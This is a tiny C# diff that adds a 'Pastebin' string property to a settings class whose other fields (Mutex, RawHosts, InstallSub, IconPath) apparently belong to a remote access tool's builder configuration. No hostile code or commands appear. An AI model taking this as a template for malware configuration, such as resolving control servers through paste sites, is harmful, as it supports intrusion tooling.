@@ -9,6 +9,7 @@
         public string Tag { get; set; }
         public string Mutex { get; set; }
         public string RawHosts { get; set; }
+        public string Pastebin { get; set; }
         public string IconPath { get; set; }
         public string Version { get; set; }
         public string InstallSub { get; set; }
